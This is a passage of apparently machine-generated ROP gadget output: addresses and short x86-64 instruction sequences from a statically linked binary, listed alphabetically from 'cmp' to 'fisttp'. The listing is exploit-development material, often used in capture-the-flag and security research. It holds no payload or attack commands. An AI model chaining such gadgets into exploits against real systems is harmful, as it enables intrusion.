0x000000000043b7c4 : cmp eax, 0xfffff000 ; ja 0x43b7d8 ; ret
0x000000000043b9cf : cmp eax, 0xfffff000 ; ja 0x43ba38 ; ret
0x000000000043ba65 : cmp eax, 0xfffff000 ; ja 0x43ba78 ; ret
0x000000000043baa2 : cmp eax, 0xfffff000 ; ja 0x43bb08 ; ret
0x000000000043bb38 : cmp eax, 0xfffff000 ; ja 0x43bb50 ; ret
0x000000000043bb68 : cmp eax, 0xfffff000 ; ja 0x43bb80 ; ret
0x000000000043bd72 : cmp eax, 0xfffff000 ; ja 0x43bdc0 ; ret
0x000000000043bde8 : cmp eax, 0xfffff000 ; ja 0x43be00 ; ret
0x000000000043c541 : cmp eax, 0xfffff000 ; ja 0x43c558 ; ret
0x000000000044a72e : cmp eax, 0xfffff000 ; ja 0x44a748 ; ret
0x0000000000461c36 : cmp eax, 0xfffff000 ; ja 0x461c48 ; ret
0x0000000000461c8a : cmp eax, 0xfffff000 ; ja 0x461ca0 ; ret
0x000000000043b6e8 : cmp eax, 0xfffff001 ; jae 0x43b6f7 ; ret
0x000000000043c778 : cmp eax, 0xfffff001 ; jae 0x43c787 ; ret
0x000000000043c7a8 : cmp eax, 0xfffff001 ; jae 0x43c7b7 ; ret
0x000000000043c7d8 : cmp eax, 0xfffff001 ; jae 0x43c7e7 ; ret
0x000000000043d91b : cmp eax, 0xfffff001 ; jae 0x43d92a ; ret
0x000000000043d948 : cmp eax, 0xfffff001 ; jae 0x43d957 ; ret
0x0000000000461bb8 : cmp eax, 0xfffff001 ; jae 0x461bc7 ; ret
0x0000000000472ea8 : cmp eax, 0xfffff001 ; jae 0x472eb7 ; ret
0x000000000043a99b : cmp eax, 2 ; je 0x43a9af ; xor eax, eax ; ret
0x000000000043da8a : cmp eax, 4 ; je 0x43da95 ; ret
0x000000000046c457 : cmp eax, dword ptr [rax] ; add byte ptr [rcx - 0x77], cl ; ret
0x000000000040bbc5 : cmp eax, dword ptr [rdi + 0x10] ; jae 0x40bbd8 ; movzx eax, byte ptr [rax] ; ret
0x0000000000438eaf : cmp eax, ecx ; jle 0x438eef ; movsxd rax, ecx ; ret
0x00000000004388c3 : cmp eax, ecx ; sbb eax, eax ; sbb eax, -1 ; ret
0x000000000040ee1b : cmp eax, edx ; jae 0x40ee47 ; movzx eax, byte ptr [rax] ; ret
0x000000000040fce9 : cmp eax, edx ; jne 0x40fcf4 ; ret
0x0000000000472664 : cmp eax, esi ; je 0x472675 ; ret
0x000000000043da26 : cmp ebx, 0xa ; je 0x43da31 ; ret
0x000000000043eece : cmp ebx, eax ; setne dl ; jmp 0x43eeba
0x000000000047d7e5 : cmp ebx, edi ; call rax
0x0000000000446ba4 : cmp ecx, 0x860f07ff ; ret
0x00000000004604d5 : cmp ecx, 0xc00 ; je 0x4604e9 ; ret
0x000000000045610d : cmp ecx, 9 ; jbe 0x4560eb ; mov qword ptr [rdi], rsi ; ret
0x000000000045c35d : cmp ecx, 9 ; jbe 0x45c33b ; mov qword ptr [rdi], rsi ; ret
0x0000000000471ba1 : cmp ecx, dword ptr [rax - 0x3f] ; loop 0x471bb2 ; add rdx, rax ; jmp 0x471bbb
0x0000000000440382 : cmp ecx, dword ptr [rax - 0x7d] ; ret
0x000000000046b3c8 : cmp ecx, dword ptr [rdi + rsi] ; jae 0x46b378 ; xor eax, eax ; ret
0x000000000045e7ee : cmp ecx, dword ptr [rdx + 0x4c] ; cmove eax, ecx ; ret
0x000000000041fb6b : cmp ecx, eax ; jne 0x41fb99 ; xor eax, eax ; ret
0x000000000046eeb2 : cmp ecx, ecx ; ret
0x000000000045e61a : cmp ecx, esi ; jne 0x45e617 ; lea eax, [rdx + rdi] ; ret
0x000000000046a176 : cmp ecx, esi ; jne 0x46a156 ; mov eax, dword ptr [rcx] ; ret
0x0000000000451670 : cmp edi, eax ; ja 0x451657 ; mov eax, r9d ; ret
0x0000000000497321 : cmp edi, ecx ; call qword ptr [rax]
0x0000000000497335 : cmp edi, ecx ; jmp qword ptr [rsi]
0x0000000000461fce : cmp edi, edx ; ja 0x461ffd ; ret
0x0000000000439262 : cmp edi, edx ; jb 0x43926f ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000497b71 : cmp edi, edx ; jmp qword ptr [rcx]
0x000000000045166f : cmp edi, r8d ; ja 0x451658 ; mov eax, r9d ; ret
0x000000000043dc21 : cmp edx, dword ptr [rdi + 0x10] ; jae 0x43dc0e ; ret
0x000000000041414a : cmp edx, eax ; jne 0x414115 ; ret
0x000000000043a04b : cmp edx, ecx ; jne 0x43a038 ; ret
0x000000000043a1b2 : cmp edx, ecx ; jne 0x43a19e ; vzeroupper ; ret
0x000000000043a375 : cmp edx, ecx ; jne 0x43a359 ; vzeroupper ; ret
0x000000000043d9aa : cmp edx, edi ; setae al ; ret
0x0000000000460bd6 : cmp edx, esi ; je 0x460be7 ; test edx, edx ; jne 0x460bd9 ; ret
0x000000000040ee59 : cmp esi, -1 ; setne al ; neg eax ; ret
0x00000000004484c4 : cmp esi, 3 ; je 0x4484d6 ; ret
0x0000000000439645 : cmp esi, dword ptr [rdx + 5] ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00000000004915c4 : cmp esi, ebp ; xlatb ; ret 0x4e27
0x000000000040f71f : cmp esi, ecx ; jb 0x40f709 ; mov byte ptr [rax + rsi], dil ; ret
0x000000000040e09a : cmp esi, ecx ; jne 0x40e097 ; lea eax, [rdx + rdi] ; ret
0x0000000000462387 : cmp esi, edi ; cmovne rax, rdx ; ret
0x000000000040d780 : cmp qword ptr [rdi + 0x38], 0 ; je 0x40d798 ; ret
0x000000000045dfe7 : cmp qword ptr [rsi + 0x30], 0 ; je 0x45dff8 ; ret
0x000000000043da25 : cmp r11d, 0xa ; je 0x43da32 ; ret
0x0000000000462335 : cmp r8b, 0x2f ; je 0x462328 ; xor eax, eax ; ret
0x0000000000446ba3 : cmp r9d, 0x860f07ff ; ret
0x000000000043b775 : cmp rax, -0x1000 ; ja 0x43b789 ; ret
0x000000000043b7c3 : cmp rax, -0x1000 ; ja 0x43b7d9 ; ret
0x000000000043b9ce : cmp rax, -0x1000 ; ja 0x43ba39 ; ret
0x000000000043ba64 : cmp rax, -0x1000 ; ja 0x43ba79 ; ret
0x000000000043baa1 : cmp rax, -0x1000 ; ja 0x43bb09 ; ret
0x000000000043bb37 : cmp rax, -0x1000 ; ja 0x43bb51 ; ret
0x000000000043bb67 : cmp rax, -0x1000 ; ja 0x43bb81 ; ret
0x000000000043bd71 : cmp rax, -0x1000 ; ja 0x43bdc1 ; ret
0x000000000043bde7 : cmp rax, -0x1000 ; ja 0x43be01 ; ret
0x000000000043c540 : cmp rax, -0x1000 ; ja 0x43c559 ; ret
0x000000000044a72d : cmp rax, -0x1000 ; ja 0x44a749 ; ret
0x0000000000461c35 : cmp rax, -0x1000 ; ja 0x461c49 ; ret
0x0000000000461c89 : cmp rax, -0x1000 ; ja 0x461ca1 ; ret
0x000000000043b6e7 : cmp rax, -0xfff ; jae 0x43b6f8 ; ret
0x000000000043c777 : cmp rax, -0xfff ; jae 0x43c788 ; ret
0x000000000043c7a7 : cmp rax, -0xfff ; jae 0x43c7b8 ; ret
0x000000000043c7d7 : cmp rax, -0xfff ; jae 0x43c7e8 ; ret
0x000000000043d91a : cmp rax, -0xfff ; jae 0x43d92b ; ret
0x000000000043d947 : cmp rax, -0xfff ; jae 0x43d958 ; ret
0x0000000000461bb7 : cmp rax, -0xfff ; jae 0x461bc8 ; ret
0x0000000000472ea7 : cmp rax, -0xfff ; jae 0x472eb8 ; ret
0x000000000046b37e : cmp rax, -1 ; cmove rax, rdx ; ret
0x000000000046d0bb : cmp rax, -3 ; jbe 0x46d0cf ; ret
0x000000000040bbc4 : cmp rax, qword ptr [rdi + 0x10] ; jae 0x40bbd9 ; movzx eax, byte ptr [rax] ; ret
0x000000000040ee1a : cmp rax, rdx ; jae 0x40ee48 ; movzx eax, byte ptr [rax] ; ret
0x000000000040fce8 : cmp rax, rdx ; jne 0x40fcf5 ; ret
0x0000000000472663 : cmp rax, rsi ; je 0x472676 ; ret
0x000000000046b3c7 : cmp rcx, qword ptr [rdi + rsi] ; jae 0x46b379 ; xor eax, eax ; ret
0x000000000045e7ed : cmp rcx, qword ptr [rdx + 0x4c] ; cmove eax, ecx ; ret
0x000000000041fb6a : cmp rcx, rax ; jne 0x41fb9a ; xor eax, eax ; ret
0x000000000045e619 : cmp rcx, rsi ; jne 0x45e618 ; lea eax, [rdx + rdi] ; ret
0x000000000046a175 : cmp rcx, rsi ; jne 0x46a157 ; mov eax, dword ptr [rcx] ; ret
0x0000000000461fcd : cmp rdi, rdx ; ja 0x461ffe ; ret
0x0000000000439261 : cmp rdi, rdx ; jb 0x439270 ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000043dc20 : cmp rdx, qword ptr [rdi + 0x10] ; jae 0x43dc0f ; ret
0x0000000000414149 : cmp rdx, r8 ; jne 0x414116 ; ret
0x000000000043a04a : cmp rdx, rcx ; jne 0x43a039 ; ret
0x000000000043a049 : cmp rdx, rcx ; jne 0x43a03a ; ret
0x000000000043a1b1 : cmp rdx, rcx ; jne 0x43a19f ; vzeroupper ; ret
0x000000000043a374 : cmp rdx, rcx ; jne 0x43a35a ; vzeroupper ; ret
0x000000000043d9a9 : cmp rdx, rdi ; setae al ; ret
0x000000000040e099 : cmp rsi, rcx ; jne 0x40e098 ; lea eax, [rdx + rdi] ; ret
0x0000000000462386 : cmp rsi, rdi ; cmovne rax, rdx ; ret
0x0000000000448b25 : cmpsb byte ptr [rsi], byte ptr [rdi] ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; rol byte ptr [rcx], 0x83 ; ret 0x4801
0x00000000004660c3 : cmpsb byte ptr [rsi], byte ptr [rdi] ; add eax, 0x83480000 ; ret
0x000000000041f5e9 : cmpsb byte ptr [rsi], byte ptr [rdi] ; add eax, 0xc0310000 ; ret
0x0000000000467be0 : cmpsb byte ptr [rsi], byte ptr [rdi] ; add rax, rsi ; jmp rax
0x000000000046c396 : cmpsb byte ptr [rsi], byte ptr [rdi] ; cmp al, 0 ; add byte ptr [rcx - 0x77], cl ; ret
0x000000000046f708 : cmpsb byte ptr [rsi], byte ptr [rdi] ; jne 0x46f714 ; ret
0x00000000004302d6 : cmpsb byte ptr [rsi], byte ptr [rdi] ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000040408e : cmpsb byte ptr [rsi], byte ptr [rdi] ; ret
0x00000000004145d5 : cmpsd dword ptr [rsi], dword ptr [rdi] ; fdivp st(7) ; dec dword ptr [rax - 0x77] ; ret 0x8548
0x0000000000475310 : cwde ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x830f
0x00000000004753a5 : cwde ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x9272
0x0000000000442c82 : cwde ; add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret
0x000000000049c2d4 : cwde ; add dword ptr [rax], 0 ; mov al, ch ; std ; jmp qword ptr [rdi]
0x000000000047a442 : cwde ; and al, byte ptr [rax] ; jne 0x47a42e ; pop rbx ; ret
0x0000000000498a99 : cwde ; cli ; call qword ptr [rax]
0x000000000044ee5e : cwde ; movzx eax, byte ptr [rdi + rax] ; mov rax, qword ptr [rsi + rax*8] ; jmp rax
0x000000000049ae28 : cwde ; pop rbp ; cld ; jmp qword ptr [rax]
0x000000000047d998 : cwde ; retf ; sti ; call rax
0x00000000004345c1 : dec byte ptr [r8 + 0x29] ; ret 0x280f
0x00000000004345c2 : dec byte ptr [rax + 0x29] ; ret 0x280f
0x0000000000439b8d : dec byte ptr [rax + 0x7f] ; jl 0x439bb2 ; cld ; vzeroupper ; ret
0x0000000000462388 : dec byte ptr [rax + 0xf] ; ret 0x31c3
0x000000000043c9de : dec byte ptr [rax + 9] ; ret
0x000000000044a822 : dec byte ptr [rax - 0x73] ; sub al, 7 ; mov rdi, rbp ; call r12
0x000000000044c209 : dec byte ptr [rax - 0x75] ; mov ebp, 0xfffff758 ; call rax
0x000000000046c7cf : dec byte ptr [rax - 0x77] ; fisttp word ptr [rax - 0x77] ; ret 0xcde8
0x000000000045f040 : dec byte ptr [rax - 0x77] ; ret
0x000000000046c76d : dec byte ptr [rax - 0x7d] ; ret
0x00000000004714d7 : dec byte ptr [rax - 0x7d] ; ret 0x4808
0x000000000046d0b9 : dec dword ptr [r8 - 0x7d] ; clc ; std ; jbe 0x46d0d1 ; ret
0x00000000004090ad : dec dword ptr [rax + 0x29] ; ret
0x0000000000434702 : dec dword ptr [rax + 0x29] ; ret 0x280f
0x000000000046dce9 : dec dword ptr [rax + 0x29] ; ret 0x894c
0x000000000040c068 : dec dword ptr [rax + 0x39] ; ret
0x000000000040b08d : dec dword ptr [rax + 0x39] ; ret 0x860f
0x000000000046e8da : dec dword ptr [rax + 0x39] ; ret 0xe075
0x0000000000473a55 : dec dword ptr [rax + 0x39] ; ret 0xf48
0x000000000047b1a3 : dec dword ptr [rax + 0x45fff8ad] ; scasb al, byte ptr [rdi] ; clc ; jmp qword ptr [rcx]
0x000000000046f35e : dec dword ptr [rax + 0x48e57506] ; mov eax, esi ; ret
0x000000000045fd49 : dec dword ptr [rax + 0xf] ; mov ebp, 0xf80148c6 ; ret
0x000000000046b381 : dec dword ptr [rax + 0xf] ; ret 0x66c3
0x0000000000415c41 : dec dword ptr [rax + 0xf] ; ret 0x8348
0x00000000004604f9 : dec dword ptr [rax + 0xf] ; ret 0x90c3
0x000000000044a7ab : dec dword ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x148
0x000000000045f191 : dec dword ptr [rax + 1] ; ret
0x0000000000402977 : dec dword ptr [rax - 0x39] ; ret
0x000000000043b66f : dec dword ptr [rax - 0x39] ; ret 0
0x000000000044c270 : dec dword ptr [rax - 0x39] ; ret 0x2c20
0x000000000043b614 : dec dword ptr [rax - 0x39] ; ret 0x8000
0x000000000047a77a : dec dword ptr [rax - 0x39] ; ret 0xe240
0x000000000047a81b : dec dword ptr [rax - 0x39] ; ret 0xf400
0x000000000047a7a0 : dec dword ptr [rax - 0x39] ; ret 0xf480
0x000000000047a7c9 : dec dword ptr [rax - 0x39] ; ret 0xf640
0x000000000047a7f2 : dec dword ptr [rax - 0x39] ; ret 0xf6c0
0x000000000047a844 : dec dword ptr [rax - 0x39] ; ret 0xfc00
0x000000000047a86d : dec dword ptr [rax - 0x39] ; ret 0xfc60
0x000000000047a896 : dec dword ptr [rax - 0x39] ; ret 0xfce0
0x000000000047a8bf : dec dword ptr [rax - 0x39] ; ret 0xfda0
0x000000000047a8e8 : dec dword ptr [rax - 0x39] ; ret 0xfe20
0x000000000047a911 : dec dword ptr [rax - 0x39] ; ret 0xfe80
0x000000000047a751 : dec dword ptr [rax - 0x39] ; ret 0xff40
0x000000000043b587 : dec dword ptr [rax - 0x39] ; ret 0xff80
0x000000000043b905 : dec dword ptr [rax - 0x39] ; ret 0xffc0
0x0000000000452173 : dec dword ptr [rax - 0x39] ; ret 0xffe0
0x000000000043b4dc : dec dword ptr [rax - 0x39] ; ret 0xffff
0x00000000004765b2 : dec dword ptr [rax - 0x75] ; add byte ptr [rcx + 1], cl ; ret 0xef89
0x0000000000456acb : dec dword ptr [rax - 0x75] ; mov ebp, 0xfffff730 ; call rax
0x0000000000476ddf : dec dword ptr [rax - 0x75] ; push rbp ; add byte ptr [rax + 0x63], cl ; ret 0xbc80
0x0000000000416273 : dec dword ptr [rax - 0x75] ; push rsp ; and al, 0x18 ; jmp 0x416245
0x000000000046d52c : dec dword ptr [rax - 0x77] ; adc byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x00000000004142c4 : dec dword ptr [rax - 0x77] ; add eax, 0x28d594 ; ret
0x0000000000474967 : dec dword ptr [rax - 0x77] ; add ebx, dword ptr [rax + 0x5a] ; pop rbx ; ret
0x0000000000479a08 : dec dword ptr [rax - 0x77] ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x000000000040197d : dec dword ptr [rax - 0x77] ; ret
0x0000000000461fbe : dec dword ptr [rax - 0x77] ; ret 0x1477
0x00000000004133d1 : dec dword ptr [rax - 0x77] ; ret 0x3d83
0x00000000004687c7 : dec dword ptr [rax - 0x77] ; ret 0x68e8
0x000000000041356c : dec dword ptr [rax - 0x77] ; ret 0x8548
0x00000000004148cb : dec dword ptr [rax - 0x77] ; ret 0x854d
0x000000000044a5d2 : dec dword ptr [rax - 0x77] ; ret 0x870f
0x000000000043adbb : dec dword ptr [rax - 0x77] ; ret 0x8948
0x000000000045afe0 : dec dword ptr [rax - 0x77] ; ret 0x8b44
0x000000000043b406 : dec dword ptr [rax - 0x77] ; ret 0x8b48
0x000000000046492c : dec dword ptr [rax - 0x77] ; ret 0x8d4c
0x000000000043c735 : dec dword ptr [rax - 0x77] ; ret 0xa076
0x000000000043b561 : dec dword ptr [rax - 0x77] ; ret 0xa0e9
0x000000000043b54d : dec dword ptr [rax - 0x77] ; ret 0xb4e9
0x0000000000416588 : dec dword ptr [rax - 0x77] ; ret 0xb60f
0x00000000004592ce : dec dword ptr [rax - 0x77] ; ret 0xb848
0x0000000000462539 : dec dword ptr [rax - 0x77] ; ret 0xe2eb
0x000000000045ce0a : dec dword ptr [rax - 0x77] ; ret 0xf41
0x000000000040500f : dec dword ptr [rax - 0x77] ; ret 0xf748
0x000000000045901d : dec dword ptr [rax - 0x77] ; test dword ptr [rax - 0x16000005], esp ; ret 0xfffd
0x00000000004101f9 : dec dword ptr [rax - 0x7b] ; ret 0x850f
0x0000000000469ccf : dec dword ptr [rax - 0x7d] ; call 0xffffffffc2cfe8df
0x00000000004572d0 : dec dword ptr [rax - 0x7d] ; clc ; dec dword ptr [rax - 0x77] ; ret
0x000000000046d0ba : dec dword ptr [rax - 0x7d] ; clc ; std ; jbe 0x46d0d0 ; ret
0x0000000000405192 : dec dword ptr [rax - 0x7d] ; ret
0x0000000000444389 : dec dword ptr [rax - 0x7d] ; ret 0x4801
0x00000000004054cb : dec dword ptr [rax - 0x7d] ; ret 0x4901
0x00000000004783a7 : dec dword ptr [rax - 0x7d] ; ret 0xe902
0x0000000000426b7c : dec dword ptr [rax - 0x7f] ; ret 0x80
0x0000000000478da4 : dec dword ptr [rax - 9] ; ret
0x000000000044fdae : dec dword ptr [rbp + 0x29] ; ret 0xf4c
0x000000000045aa3c : dec dword ptr [rbp + 0x63] ; ret
0x000000000044ac26 : dec dword ptr [rbp - 0x7b] ; dec dword ptr [rax - 0x77] ; ret
0x0000000000400d94 : dec dword ptr [rbx + 0x2a306115] ; add bh, dh ; ret 0
0x000000000045e558 : dec dword ptr [rbx - 0x14f3db8c] ; ret 0x5590
0x000000000044fc54 : dec dword ptr [rcx + 0x39] ; ret
0x000000000045013a : dec dword ptr [rcx + 0x39] ; ret 0x850f
0x0000000000467e41 : dec dword ptr [rcx + 0x39] ; ret 0x860f
0x000000000045a804 : dec dword ptr [rcx + 0x39] ; ror byte ptr [rdi], 0x85 ; ret 0xffe8
0x0000000000458aba : dec dword ptr [rcx + 0x63] ; ret
0x00000000004680b5 : dec dword ptr [rcx + rax - 0x28] ; call rax
0x00000000004692c1 : dec dword ptr [rcx + rcx*4 + 0x65] ; mov byte ptr [rax - 0x77], cl ; ret
0x0000000000453164 : dec dword ptr [rcx + rcx*4 - 0x12] ; mov rdi, rbx ; call rax
0x000000000044a935 : dec dword ptr [rcx + rcx*4 - 0x16] ; call r12
0x0000000000440bc9 : dec dword ptr [rcx + rcx*4 - 9] ; mov rsi, qword ptr [rbp - 0x70] ; call rsi
0x000000000044c066 : dec dword ptr [rcx - 0x2f42763f] ; idiv bh ; call rax
0x0000000000467ba8 : dec dword ptr [rcx - 0x77] ; ret
0x0000000000468180 : dec dword ptr [rcx - 0x77] ; ret 0x43e9
0x0000000000468b80 : dec dword ptr [rcx - 0x77] ; ret 0xbbe9
0x0000000000411c8a : dec dword ptr [rcx - 0x7b] ; ret
0x000000000040f916 : dec dword ptr [rcx - 9] ; ret
0x000000000047df6b : dec dword ptr [rdi] ; fdivr st(3) ; jmp rdx
0x000000000044238b : dec dword ptr [rdi] ; ret 0x41c3
0x00000000004580d6 : dec dword ptr [rdi] ; test byte ptr [rcx - 0x7c000015], al ; ret
0x000000000044de18 : dec dword ptr [rdi] ; test dword ptr [rbp - 0x1600001b], ebp ; ret 0xffe6
0x0000000000438750 : dec dword ptr [rdi] ; test dword ptr [rsi + 1], ebp ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000464751 : dec dword ptr [rdi] ; test eax, ebx ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x000000000046925a : dec dword ptr [rdi] ; xchg bh, cl ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000414a6c : dec dword ptr [rdi] ; xchg eax, ebp ; ret 0xd020
0x000000000040ee5b : dec dword ptr [rdi] ; xchg eax, ebp ; sal bh, 0xd8 ; ret
0x000000000046ca79 : dec dword ptr [rdi] ; xchg eax, esi ; rol byte ptr [rbp - 0x75], 0x5f ; adc al, 9 ; ret 0x8b48
0x0000000000493e63 : dec dword ptr [rdx] ; sub al, 0xfe ; call qword ptr [rip + 0x20fffe2c]
0x0000000000492fff : dec esp ; leave ; std ; jmp rsp
0x0000000000434701 : dec qword ptr [r8 + 0x29] ; ret 0x280f
0x0000000000444388 : dec qword ptr [rax - 0x7d] ; ret 0x4801
0x000000000045ff32 : div byte ptr [rbp + 4] ; xor rax, rax ; ret
0x00000000004484c1 : div byte ptr [rsp + rcx - 0x7d] ; inc byte ptr [rbx] ; je 0x4484d9 ; ret
0x0000000000451686 : div eax ; add r9d, eax ; mov eax, r9d ; ret
0x000000000045cec6 : div ebp ; mov rbp, rax ; jmp 0x45ce95
0x000000000043a588 : div ecx ; mov eax, eax ; ret
0x000000000043a56f : div ecx ; pop rbx ; mov eax, eax ; ret
0x0000000000496fb9 : div edi ; jmp qword ptr [rbx]
0x000000000045cec5 : div r13 ; mov rbp, rax ; jmp 0x45ce96
0x0000000000451685 : div r8d ; add r9d, eax ; mov eax, r9d ; ret
0x000000000041dc47 : enter -0x23b, -0x29 ; ret 0xc085
0x000000000046a130 : enter -0x3eb8, -8 ; add cl, byte ptr [rax - 0x77] ; ret 0xc148
0x00000000004599d8 : enter -0x3eb8, -8 ; add cl, byte ptr [rcx + 0x29] ; ret
0x00000000004388c4 : enter -0x3fe7, -0x7d ; fdivr st(7) ; ret
0x00000000004345be : enter -0x72b8, 0x49 ; dec byte ptr [rax + 0x29] ; ret 0x280f
0x00000000004346fe : enter -0x72b8, 0x49 ; dec dword ptr [rax + 0x29] ; ret 0x280f
0x000000000041da27 : enter -0x73b, 0x77 ; ret
0x0000000000462446 : enter -0x7bf1, -0x1d ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000041e3f4 : enter -2, -1 ; ret
0x0000000000432b49 : enter 0x148, -8 ; vzeroupper ; ret
0x000000000046f1a1 : enter 0x289, -0x48 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x0000000000432eae : enter 0x2948, -0x30 ; vzeroupper ; ret
0x0000000000417fad : enter 0x31c3, -0x40 ; ret
0x0000000000438eb0 : enter 0x357e, 0x48 ; movsxd rax, ecx ; ret
0x000000000040fce7 : enter 0x3948, -0x30 ; jne 0x40fcf6 ; ret
0x0000000000456238 : enter 0x415d, 0x5c ; pop r13 ; ret
0x000000000045617d : enter 0x5d5b, 0x41 ; pop rsp ; pop r13 ; ret
0x0000000000491d7c : enter 0x8ac, 0x47 ; and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x000000000045507e : enter 0xf4c, 0x4e ; ret 0x3145
0x000000000041f696 : enter 0xf66, -0x11 ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000432511 : enter 0xf66, -0x15 ; ret
0x00000000004774c3 : fadd dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rbx + rbx*8 - 0xd], dh ; ret
0x0000000000407e58 : fadd dword ptr [rax] ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x00000000004079d7 : fadd dword ptr [rax] ; add byte ptr [rax], al ; ret
0x0000000000454a9c : fadd dword ptr [rbx] ; add byte ptr [rcx + 0xf], al ; xchg eax, esp ; ret 0xc931
0x000000000045aa5a : fadd dword ptr [rcx - 0x77] ; ret
0x0000000000451673 : fadd qword ptr [rcx + rcx*4 - 0x38] ; ret
0x000000000047ed0c : fadd qword ptr [rdx] ; cld ; jmp qword ptr [rbx]
0x000000000041f1e1 : fbld tbyte ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000047a2d4 : fbstp tbyte ptr [rbp - 0x17] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004913b8 : fcmovb st(0), st(3) ; ret
0x000000000047d4d4 : fcmovb st(0), st(4) ; cli ; ljmp [rdx - 0x3c] ; cli ; call qword ptr [rax]
0x0000000000432fcb : fcmovnb st(0), st(5) ; std ; xlatb ; ret
0x0000000000457eca : fcmovnb st(0), st(6) ; test eax, esi ; idiv bh ; jmp qword ptr [rax]
0x000000000044d13e : fcmovnb st(0), st(6) ; test esp, eax ; idiv bh ; jmp qword ptr [rax]
0x0000000000499614 : fcom dword ptr [rsi] ; add byte ptr [rax + 0xd], cl ; sti ; call qword ptr [rcx]
0x00000000004774c9 : fcomi st(3) ; ret
0x0000000000408549 : fcomp dword ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; ret
0x000000000040bf46 : fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x000000000040fc55 : fcomp dword ptr [rbx + 0x5d] ; ret
0x0000000000499914 : fcomp dword ptr [rcx] ; add al, ch ; sbb bl, bh ; call qword ptr [rax]
0x0000000000492139 : fcomp dword ptr [rdx + 0x21] ; ret
0x00000000004903a0 : fcomp qword ptr [rdi - 0x4a] ; ret 0x474c
0x0000000000472dc7 : fdiv dword ptr [rbp + 0xa] ; add rsp, 0x30 ; pop rbx ; ret
0x0000000000497714 : fdiv dword ptr [rdi] ; add byte ptr [rax], al ; js 0x497749 ; cli ; call qword ptr [rax]
0x0000000000475119 : fdiv st(3) ; ret
0x0000000000494199 : fdiv st(6) ; call rcx
0x00000000004145d6 : fdivp st(7) ; dec dword ptr [rax - 0x77] ; ret 0x8548
0x000000000047e1c5 : fdivr st(3) ; call rsp
0x000000000047df69 : fdivr st(3) ; dec dword ptr [rdi] ; fdivr st(3) ; jmp rdx
0x000000000047de29 : fdivr st(3) ; jmp qword ptr [rsi]
0x000000000047df6d : fdivr st(3) ; jmp rdx
0x000000000048f6f5 : fdivr st(4) ; test al, 0x97 ; xchg eax, esp ; ret
0x00000000004388c8 : fdivr st(7) ; ret
0x0000000000407488 : fiadd dword ptr [rbp + 0x450f48c9] ; ret 0x8348
0x0000000000491f86 : ficomp word ptr [rdx - 0x19] ; cmc ; mov ch, 0xab ; ret
0x0000000000472a35 : fidivr dword ptr [rax + 1] ; ret
0x000000000047219b : fidivr word ptr [rax + 0x5b9066ff] ; ret
0x0000000000416a11 : fild word ptr [r9] ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x0000000000416a12 : fild word ptr [rcx] ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x000000000046c7c7 : fimul dword ptr [rax + 0x39] ; ret 0x7472
0x000000000041c776 : fimul dword ptr [rax + rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000045a6db : fimul dword ptr [rbp + 0x63] ; ret
0x000000000044a880 : fimul word ptr [rax - 0x77] ; out dx, eax ; call r12
0x000000000041340d : fimul word ptr [rax - 0x77] ; xlatb ; pop rbx ; jmp 0x40f6a7
0x000000000046efee : fimul word ptr [rbp + rcx*4 + 0xa] ; jmp 0x46f048
0x0000000000472b3e : fimul word ptr [rbp + rcx*4 + 0xa] ; jmp 0x472b98
0x000000000040afbb : fistp word ptr [rbx + 0x5d] ; jmp rax
0x000000000045deb0 : fistp word ptr [rbx + 0x5d] ; pop r12 ; jmp rax
0x000000000040b02b : fistp word ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; jmp rax
0x00000000004486d7 : fisttp dword ptr [rax - 0x77] ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x000000000046e431 : fisttp dword ptr [rax - 0x77] ; ret
0x0000000000466081 : fisttp dword ptr [rbp - 0x73] ; ret
0x00000000004768f0 : fisttp dword ptr [rbx + 0x63] ; add al, 0x99 ; add rax, r9 ; jmp rax
0x000000000046e44b : fisttp dword ptr [rcx - 0x77] ; ret 0x8b4a
0x000000000046a29f : fisttp dword ptr [rdi + rcx + 0x44] ; ror byte ptr [rcx + rcx*4 - 0x40], 0x5b ; ret
0x00000000004690d4 : fisttp dword ptr [rdi] ; xchg eax, ebp ; ret
0x00000000004054ee : fisttp qword ptr [rax - 0x7d] ; ret 0x4401
0x0000000000447ba2 : fisttp qword ptr [rdi] ; ret 0xc389
0x000000000045631e : fisttp word ptr [rax - 0x75] ; jl 0x45634f ; adc byte ptr [rax - 0x7d], cl ; ret
0x000000000046c7d2 : fisttp word ptr [rax - 0x77] ; ret 0xcde8
0x00000000004017e3 : fisttp word ptr [rax - 0x7d] ; ret
0x000000000046e4cf : fisttp word ptr [rax] ; add rdx, r8 ; mov rax, rdx ; pop rbx ; ret
0x000000000043160d : fisttp word ptr [rip - 0x7cb80000] ; ret 0x4910
